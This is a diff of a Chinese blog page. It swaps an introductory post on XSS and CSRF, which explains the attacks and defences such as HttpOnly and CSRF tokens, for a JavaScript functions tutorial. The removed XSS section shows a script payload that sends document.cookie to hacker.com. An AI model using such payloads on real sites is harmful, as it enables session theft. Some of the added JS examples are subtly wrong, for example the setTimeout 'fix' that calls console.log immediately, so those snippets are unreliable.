@@ -126,17 +126,17 @@
 
 
 
-<meta name="description" content="初次理解XSS和CSRF攻击">
+<meta name="description" content="定义一个函数12345678910111213141516171819202122232425262728// 1. 具名函数function 函数名(形式参数1， 形式参数2)&amp;#123;    语句    return 返回值&amp;#125;// 2. 匿名函数（即具名函数去掉函数名，也叫函数表达式）let a = function(x,y) &amp;#123;    return x+y;&amp;#125;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="安全：XSS和CSRF">
-<meta property="og:url" content="http://yoursite.com/2018/08/16/安全：XSS和CSRF/index.html">
+<meta property="og:title" content="JS函数">
+<meta property="og:url" content="http://yoursite.com/2022/03/16/JS函数/index.html">
 <meta property="og:site_name" content="Joyce">
-<meta property="og:description" content="初次理解XSS和CSRF攻击">
+<meta property="og:description" content="定义一个函数12345678910111213141516171819202122232425262728// 1. 具名函数function 函数名(形式参数1， 形式参数2)&amp;#123;    语句    return 返回值&amp;#125;// 2. 匿名函数（即具名函数去掉函数名，也叫函数表达式）let a = function(x,y) &amp;#123;    return x+y;&amp;#125;">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2022-03-14T11:17:53.232Z">
+<meta property="og:updated_time" content="2022-03-21T06:46:22.007Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="安全：XSS和CSRF">
-<meta name="twitter:description" content="初次理解XSS和CSRF攻击">
+<meta name="twitter:title" content="JS函数">
+<meta name="twitter:description" content="定义一个函数12345678910111213141516171819202122232425262728// 1. 具名函数function 函数名(形式参数1， 形式参数2)&amp;#123;    语句    return 返回值&amp;#125;// 2. 匿名函数（即具名函数去掉函数名，也叫函数表达式）let a = function(x,y) &amp;#123;    return x+y;&amp;#125;">
 
 
 
@@ -166,13 +166,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/08/16/安全：XSS和CSRF/">
+  <link rel="canonical" href="http://yoursite.com/2022/03/16/JS函数/">
 
 
 
 
 
-  <title>安全：XSS和CSRF | Joyce</title>
+  <title>JS函数 | Joyce</title>
   
 
 
@@ -342,7 +342,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/16/安全：XSS和CSRF/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/03/16/JS函数/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Joyce">
@@ -359,7 +359,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">安全：XSS和CSRF</h1>
+          <h1 class="post-title" itemprop="name headline">JS函数</h1>
         
 
         <div class="post-meta">
@@ -371,8 +371,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-16T14:34:13+08:00">
-                2018-08-16
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-16T21:07:04+08:00">
+                2022-03-16
               </time>
             
 
@@ -405,7 +405,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  1,152
+                  828
                 </span>
               
 
@@ -430,31 +430,41 @@
       
 
       
-        <p>初次理解XSS和CSRF攻击<br><a id="more"></a></p>
-<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>全称 Cross Site Script 跨站脚本攻击，原本缩写为CSS，但为了区别于层叠样式表，在安全领域称为XSS。</p>
-<p>XSS攻击是指攻击者在网站上注入恶意的客户端代码，通过恶意脚本对客户端网页进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。</p>
-<p>有多种方式进行XSS攻击，但它们的共同点是：将一些隐私数据像cookie、session发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者使用的机器上进行一些恶意操作</p>
-<p>常见的基于DOM的XSS攻击是指通过恶意脚本修改页面DOM结构，是纯粹发生在客户端的攻击，eg：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div.innerHTML = userComment</span><br><span class="line"></span><br><span class="line">// userComment 内容是 &lt;script&gt;$.get(&apos;http://hacker.com?cookie=&apos; + document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>此时恶意就被执行了</p>
-<h3 id="XSS防范"><a href="#XSS防范" class="headerlink" title="XSS防范"></a>XSS防范</h3><p>1、HttpOnly 这个属性可以防止XSS，它会禁止javascript脚本来访问cookie。</p>
-<p>前面说道攻击者可以通过注入恶意脚本获取用户的cookie信息，通常cookie中都包含了用户的登录凭证信息，攻击者在获取到cookie之后，就可以发起cookie劫持攻击。所以严格来说HttpOnly并非阻止XSS攻击，而是阻止XSS攻击后的cookie劫持</p>
-<p>2、不要使用innerHTML，改成innerText，此时script标签里的内容就会被当成文本，不执行。</p>
-<p>如果一定要用innerHTML，使用字符过滤（XSS filter），在前端框架中一般都会有一份decodingMap，用于对用户输入的包含特殊字符进行过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const decodingMap = &#123;</span><br><span class="line">    &apos;&amp;lt;&apos;: &apos;&lt;&apos;,</span><br><span class="line">    &apos;&amp;gt;&apos;: &apos;&gt;&apos;,</span><br><span class="line">    &apos;&amp;quot;&apos;: &apos;&quot;&apos;,</span><br><span class="line">    &apos;&amp;amp;&apos;: &apos;&amp;&apos;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>全称：Cross Site Request Forgery 即跨站请求伪造，是一种劫持受信任用户像服务器发送非预期请求的攻击方式</p>
-<p>通常情况下，CSRF攻击是攻击者借助受害者的cookie骗取服务器信任，可以在受害者不知情的情况下以受害者名义伪造请求发送给受攻击的服务器，从而在并未授权的情况下执行在权限保护之下的操作</p>
-<p>eg：</p>
-<ul>
-<li>用户在 qq.com 登陆</li>
-<li>用户切换到 hacker.com （恶意网站）</li>
-<li>hacker.com 发送一个 qq.com/add-friend 的请求，让用户添加hacker为好友</li>
-<li>用户在不知情的情况下添加了hacker为好友</li>
-<li>用户本身没有想发送这个请求，但hacker伪造了用户发请求的假象</li>
-</ul>
-<p>由于 cookie 中包含了用户的认证信息，当用户访问攻击者准备的攻击环境时，攻击者就可以对服务器发起CSRF攻击。在攻击过程中，攻击者借助受害者的cookie骗取服务器信任，但并不能拿到cookie，也看不到cookie的内容，对于服务器返回的内容，由于同源策略的限制，也无法进行解析。所以，攻击者无法从返回结果中得到任何东西。所能做的就是给服务器发送请求，执行请求中的命令，在服务器直接改变数据的值，而非窃取服务器中的数据。</p>
-<h3 id="CSRF防范"><a href="#CSRF防范" class="headerlink" title="CSRF防范"></a>CSRF防范</h3><p>1、验证码<br>从上面的例子可以看出，CSRF攻击往往是在用户不知情的情况下构造了网络请求，而验证码会强制用户与应用进行交互，才能最终完成并提交请求。</p>
-<p>2、Referer Check<br>根据HTTP协议，在HTTP头部有一个字段叫 Referer ，它记录着HTTP请求的来源地址，通过它可以检查请求是否来自合法的源。因此要防范CSRF攻击，只需验证它的 Referer 值，如果是以相同域名开头的，就是来自网站自己的请求，是合法的，如果是来自其他网站的，可以拒绝该请求</p>
-<p>3、添加token验证<br>CSRF攻击能成功的原因在于攻击者可以伪造用户请求，该请求中所有的用户验证信息都存在于cookie中，要抵御该攻击，关键是要在请求中放入攻击者不能伪造的信息，并且该信息不能存在于cookie中。可以在HTTP请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证 token，从而判断是否是CSRF攻击</p>
-<p>更多详细内容：<a href="https://mp.weixin.qq.com/s/Rf4dag7Z1rFNl4LxbAjyqw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Rf4dag7Z1rFNl4LxbAjyqw</a></p>
+        <h2 id="定义一个函数"><a href="#定义一个函数" class="headerlink" title="定义一个函数"></a>定义一个函数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 具名函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> 函数名(<span class="params">形式参数<span class="number">1</span>， 形式参数<span class="number">2</span></span>)</span>&#123;</span><br><span class="line">    语句</span><br><span class="line">    <span class="keyword">return</span> 返回值</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 匿名函数（即具名函数去掉函数名，也叫函数表达式）</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 箭头函数</span></span><br><span class="line"><span class="keyword">let</span> f1 = <span class="function"><span class="params">x</span> =&gt;</span> x * x;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f2 = <span class="function">(<span class="params">x,y</span>) =&gt;</span> x+y;  <span class="comment">// 圆括号不能省</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f3 = <span class="function">(<span class="params">x,y</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;  <span class="comment">// 花括号不能省</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f4 = <span class="function">(<span class="params">x,y</span>) =&gt;</span> (&#123;</span><br><span class="line">    name: x;</span><br><span class="line">    age: y;</span><br><span class="line">&#125;)  <span class="comment">// 直接返回对象会报错，需要加圆括号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 用构造函数</span></span><br><span class="line"><span class="keyword">let</span> f5 = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'return x+y'</span>)  <span class="comment">// 基本没人用，所有函数都是Function构造出来的，包括Object、Array</span></span><br></pre></td></tr></table></figure>
+<h2 id="函数自身与函数调用"><a href="#函数自身与函数调用" class="headerlink" title="函数自身与函数调用"></a>函数自身与函数调用</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fn = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'hi'</span>);</span><br><span class="line">fn  <span class="comment">// 不会有任何结果，因为fn没有调用</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fn = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'hi'</span>);</span><br><span class="line">fn()  <span class="comment">// 打印出hi，有圆括号()才是调用</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fn = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'hi'</span>)</span><br><span class="line"><span class="keyword">let</span> fn2 = fn</span><br><span class="line">fn2()</span><br><span class="line"><span class="comment">// fn保存了匿名函数的地址，这个地址被复制给了fn2，fn2()调用了匿名函数</span></span><br><span class="line"><span class="comment">// fn和fn2()都是匿名函数的引用而已，真正的函数不是fn也不是fn2</span></span><br></pre></td></tr></table></figure>
+<h2 id="JS函数执行时机"><a href="#JS函数执行时机" class="headerlink" title="JS函数执行时机"></a>JS函数执行时机</h2><p>函数的调用时机不同，会得到不同结果</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不知道会打印出什么，因为没有调用函数</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印出1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;</span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">fn()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印出2</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br><span class="line">a = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印出1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(a)</span><br><span class="line">    &#125;,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br><span class="line">a = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印出2</span></span><br></pre></td></tr></table></figure>
+<h3 id="异步函数"><a href="#异步函数" class="headerlink" title="异步函数"></a>异步函数</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i)</span><br><span class="line">    &#125;,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 会打印出6个6，而不是0,1,2,3,4,5</span></span><br><span class="line"><span class="comment">// setTimeout会等当前的for循环执行完，再去执行console.log(i)，而for循环执行完后，i=6，所以会打印出6个6</span></span><br></pre></td></tr></table></figure>
+<p><strong><em>如何让上面的代码打印出0,1,2,3,4,5</em></strong></p>
+<ol>
+<li><p>for、let配合使用，let会单独创建一个作用域，每次循环会多创建一个i，相当于有6个i</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i)</span><br><span class="line">    &#125;,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在for循环内部声明一个新的变量来存储i的值</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> i</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">let</span> x = i</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(x)</span><br><span class="line">    &#125;,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>立即执行函数，把当前for循环过程中的i传递进去，构建块级作用域</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(i)</span><br><span class="line">        &#125;, <span class="number">0</span>)</span><br><span class="line">    &#125;)(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用setTimeout函数的第三个参数，会作为回调函数的第一个参数传入</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">    setTimeout(<span class="built_in">console</span>.log(i), <span class="number">1000</span>, i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用try…catch…</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123; </span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">     <span class="keyword">throw</span> i;</span><br><span class="line">  &#125;<span class="keyword">catch</span>(i)&#123;</span><br><span class="line">     setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123; </span><br><span class="line">        <span class="built_in">console</span>.log(i) </span><br><span class="line">    &#125;, <span class="number">0</span>)    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用递归配合setTimeout()</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i &lt; <span class="number">6</span> ? setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="built_in">console</span>.log(i);fn(++i),<span class="number">0</span>&#125;) : i</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用promise</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    timeoutPromise(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">timeoutPromise</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(i);</span><br><span class="line">            resolve(<span class="literal">true</span>);</span><br><span class="line">        &#125;, <span class="number">0</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
 
       
     </div>
@@ -479,8 +489,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/08/14/web前端性能优化/" rel="next" title="web前端性能优化">
-                <i class="fa fa-chevron-left"></i> web前端性能优化
+              <a href="/2022/03/15/JS数组/" rel="next" title="JS数组">
+                <i class="fa fa-chevron-left"></i> JS数组
               </a>
             
           </div>
@@ -488,10 +498,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/08/20/AJAX/" rel="prev" title="AJAX">
-                AJAX <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -671,7 +677,7 @@ show_date_time();
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">1.</span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS防范"><span class="nav-number">2.</span> <span class="nav-text">XSS防范</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF"><span class="nav-number">3.</span> <span class="nav-text">CSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF防范"><span class="nav-number">4.</span> <span class="nav-text">CSRF防范</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#定义一个函数"><span class="nav-number">1.</span> <span class="nav-text">定义一个函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#函数自身与函数调用"><span class="nav-number">2.</span> <span class="nav-text">函数自身与函数调用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JS函数执行时机"><span class="nav-number">3.</span> <span class="nav-text">JS函数执行时机</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#异步函数"><span class="nav-number">3.1.</span> <span class="nav-text">异步函数</span></a></li></ol></li></ol></div>
             
 
           </div>
